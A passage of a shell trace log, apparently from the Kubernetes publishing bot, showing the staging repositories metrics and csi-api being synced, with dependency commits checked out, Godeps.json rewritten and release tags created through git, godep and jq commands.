k_last_kube_merge=4e599c848401470c3c10eb52252c5e3bb5463d3b\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 6dd46049f39503a1fc8d65de4bd566829e95faff ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\t+ echo 'Checking out k8s.io/apimachinery to 6dd46049f39503a1fc8d65de4bd566829e95faff'\n>\t+ git checkout -q 6dd46049f39503a1fc8d65de4bd566829e95faff\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-api-release-1.12\n>\t+ '[' -z b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc\n>\t+ echo 'Checking out k8s.io/api to b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc'\n>\t+ git checkout -q b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.'\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4e599c848401470c3c10eb52252c5e3bb5463d3b.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4e599c848401470c3c10eb52252c5e3bb5463d3b ../kube-commits-client-go-release-9.0\n>\t+ '[' -z 3e32c8333043fc2c058455f4d32986a89d31b05b ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 3e32c8333043fc2c058455f4d32986a89d31b05b'\n>\tChecking out k8s.io/client-go to 3e32c8333043fc2c058455f4d32986a89d31b05b\n>\t+ git checkout -q 3e32c8333043fc2c058455f4d32986a89d31b05b\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code c6bb70553a8287cd6451211dd366fee12e088b95\n>\tRemove redundant godep commits on-top of c6bb70553a8287cd6451211dd366fee12e088b95.\n>\t+ echo 'Remove redundant godep commits on-top of c6bb70553a8287cd6451211dd366fee12e088b95.'\n>\t+ git reset --soft -q c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'c6bb705 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.12\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-metrics-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at c6bb70553a8287cd6451211dd366fee12e088b95 because \"kubernetes-1.12.0\" seems to be relevant.\n>\tWriting source->dest hash mapping to \"../tag-metrics-kubernetes-1.12.0-mapping\"\n>\tChecking that Godeps.json points to the actual tags in apimachinery, api, client-go.\n>\tChecking out branch tag commit c6bb70553a8287cd6451211dd366fee12e088b95.\n>\tBumping k8s.io/api in Godeps.json from \"b9bd491cc8f21b9461d2a6cf277542dc4c53e7fc\" to kubernetes-1.12.0: \"e168991efc204ecf3b3df686b746d2960fbb46f0\".\n>\tBumping k8s.io/client-go in Godeps.json from \"3e32c8333043fc2c058455f4d32986a89d31b05b\" to kubernetes-1.12.0: \"5c94fb65d4b2c0c5883a183a33055468af569e91\".\n>\tAdding extra commit fixing dependencies to point to kubernetes-1.12.0 tags.\n>\tTagging 02a2a1467ac6d8819bd7db2a6e85b0d4f308be06 as \"kubernetes-1.12.0\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' c6bb70553a8287cd6451211dd366fee12e088b95 '!=' c6bb70553a8287cd6451211dd366fee12e088b95 ']'\n>\t+ git checkout release-1.12\n>\tPrevious HEAD position was 02a2a14... Fix Godeps.json to point to kubernetes-1.12.0 tags\n>\tSwitched to branch 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[03 Oct 18 04:35 UTC]: Successfully constructed release-1.12\n>[03 Oct 18 04:35 UTC]: Successfully ensured /go-workspace/src/k8s.io/csi-api exists\n>[03 Oct 18 04:35 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[03 Oct 18 04:35 UTC]: /publish_scripts/construct.sh csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f11ea40ed011889985e5ac8998741b4377e3f85a\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f11ea40ed011889985e5ac8998741b4377e3f85a\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\t+ echo 'Switching to origin/master.'\n>\tSwitching to origin/master.\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' c179a9c9df4bfb6421258a5f31da9f595474ada4 '!=' f11ea40ed011889985e5ac8998741b4377e3f85a ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''f11ea40ed011889985e5ac8998741b4377e3f85a'\\'' to '\\''c179a9c9df4bfb6421258a5f31da9f595474ada4'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'f11ea40ed011889985e5ac8998741b4377e3f85a' to 'c179a9c9df4bfb6421258a5f31da9f595474ada4'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 31ae05d8096db803f5b4ff16cda6059c0a9cc861.\n>\t+ echo 'Starting at existing master commit 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit c179a9c9df4bfb6421258a5f31da9f595474ada4.\n>\t+ echo 'Checked out source commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B master\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_base_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream/master --ancestry-path\n>\t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local k_base_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t+ git branch -f filtered-branch-base a94ea824eb59e92188f166c302d7995ba9002667\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\tRunning git filter-branch ...\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=935cc6b5b5d523aded922f72b39488769d3f431d\n>\t++ git log --first-parent --format=%H --reverse 935cc6b5b5d523aded922f72b39488769d3f431d..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ local dst_old_head=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 '!=' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream-branch --ancestry-path\n>\t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local k_last_kube_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apimachinery-master\n>\tChecking out k8s.io/apimachinery to b90fb3933738446b5a2196f37f3a8d24cbc5eb93\n>\t+ '[' -z b90fb3933738446b5a2196f37f3a8d24cbc5eb93 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to b90fb3933738446b5a2196f37f3a8d24cbc5eb93'\n>\t+ git checkout -q b90fb3933738446b5a2196f37f3a8d24cbc5eb93\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-api-master\n>\t+ '[' -z 0d2438381651a1fe2816a9ac1923eeefa129e254 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 0d2438381651a1fe2816a9ac1923eeefa129e254'\n>\tChecking out k8s.io/api to 0d2438381651a1fe2816a9ac1923eeefa129e254\n>\t+ git checkout -q 0d2438381651a1fe2816a9ac1923eeefa129e254\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-client-go-master\n>\tChecking out k8s.io/client-go to 087039522ddde9317ecf61500c4ebe598e9f69cb\n>\t+ '[' -z 087039522ddde9317ecf61500c4ebe598e9f69cb ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 087039522ddde9317ecf61500c4ebe598e9f69cb'\n>\t+ git checkout -q 087039522ddde9317ecf61500c4ebe598e9f69cb\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apiextensions-apiserver\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.\n>\t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apiextensions-apiserver-master\n>\t+ '[' -z 05e89e265cc594459a3d33a63e779d94e6614c63 ']'\n>\t+ pushd ../apiextensions-apiserver\n>\tChecking out k8s.io/apiextensions-apiserver to 05e89e265cc594459a3d33a63e779d94e6614c63\n>\t+ echo 'Checking out k8s.io/apiextensions-apiserver to 05e89e265cc594459a3d33a63e779d94e6614c63'\n>\t+ git checkout -q 05e89e265cc594459a3d33a63e779d94e6614c63\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\tRunning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached 